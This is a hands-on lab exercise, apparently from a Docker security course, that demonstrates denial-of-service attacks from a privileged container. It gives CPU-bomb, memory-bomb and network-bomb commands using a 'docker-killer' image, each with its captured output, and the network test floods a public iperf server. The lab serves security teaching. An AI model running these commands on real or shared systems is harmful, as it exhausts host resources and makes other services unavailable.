## Denial of Service

## Please Note: VM might freeze/crash for these exercises.

###### A malicious user with access to docker can consume host-resources such as CPU, Memory and Network by launching a malicious container. This can cause a Denial-of-Service attack making other services inaccessible.

##### Step 1:

* Open Terminal

![](img/Open-Terminal.png)


### CPU Bomb

##### Step 1:

*  Run `docker run --rm -ti --privileged -v /:/rootfs -e "TIMEOUT=5"  monitoringartist/docker-killer cpubomb`

```commandline
root@we45:~# docker run --rm -ti --privileged -v /:/rootfs -e "TIMEOUT=5"  monitoringartist/docker-killer cpubombcpubomb - duration 5s
Test: excessive CPU utilization - one proces per processor with empty cycles
CPU:  90% usr  10% sys   0% nic   0% idle   0% io   0% irq   0% sirq
CPU: 100% usr   0% sys   0% nic   0% idle   0% io   0% irq   0% sirq
CPU: 100% usr   0% sys   0% nic   0% idle   0% io   0% irq   0% sirq
CPU: 100% usr   0% sys   0% nic   0% idle   0% io   0% irq   0% sirq
CPU:  98% usr   1% sys   0% nic   0% idle   0% io   0% irq   0% sirq
/test.sh: line 101:     6 Killed                  timeout -t ${TIMEOUT} -s KILL bash -c $@    
```


### Memory Bomb

##### Step 1:

* Run `docker run --rm -ti --privileged -v /:/rootfs -e "TIMEOUT=5" monitoringartist/docker-killer membomb`

```commandline
root@we45:~# docker run --rm -ti --privileged -v /:/rootfs -e "TIMEOUT=5" monitoringartist/docker-killer membomb
membomb - duration 5s
Test: excessive memory (RAM+swap) utilization
Mem: 1180028K used, 869832K free, 2900K shrd, 70124K buff, 575144K cached
Mem: 1704688K used, 345172K free, 2900K shrd, 70124K buff, 575144K cached
Mem: 1984284K used, 65576K free, 2688K shrd, 9100K buff, 253900K cached
Mem: 1993548K used, 56312K free, 2680K shrd, 96K buff, 69932K cached
Mem: 1994392K used, 55468K free, 2680K shrd, 244K buff, 52960K cached
/test.sh: line 101:     6 Killed                  timeout -t ${TIMEOUT} -s KILL bash -c $@
```   

### Network Bomb

##### Step 1:

* Run `docker run --rm -ti --privileged -v /:/rootfs -e "TIMEOUT=5" monitoringartist/docker-killer netbomb`

```commandline
root@we45:~# docker run --rm -ti --privileged -v /:/rootfs -e "TIMEOUT=5" monitoringartist/docker-killer netbomb
netbomb - duration 5s
Test: excessive network utilization - iperf against public iperf server
Used command: iperf -c iperf.scottlinux.com -t 4 -i 1 -p 5201 -u
------------------------------------------------------------
Client connecting to iperf.scottlinux.com, UDP port 5201
Sending 1470 byte datagrams, IPG target: 11215.21 us (kalman adjust)
UDP buffer size:  208 KByte (default)
------------------------------------------------------------
[  3] local 172.17.0.2 port 50153 connected with 45.33.39.39 port 5201
[ ID] Interval       Transfer     Bandwidth
[  3]  0.0- 1.0 sec   131 KBytes  1.07 Mbits/sec
[  3]  1.0- 2.0 sec   128 KBytes  1.05 Mbits/sec
[  3]  2.0- 3.0 sec   128 KBytes  1.05 Mbits/sec
[  3]  3.0- 4.0 sec   128 KBytes  1.05 Mbits/sec
[  3]  0.0- 4.0 sec   514 KBytes  1.05 Mbits/sec
[  3] Sent 358 datagrams
/test.sh: line 101:     6 Killed                  timeout -t ${TIMEOUT} -s KILL bash -c $@
```


##### Stop all running docker containers

* Run `clean-docker` to stop all the containers

```commandline
root@we45:~$ clean-docker
```
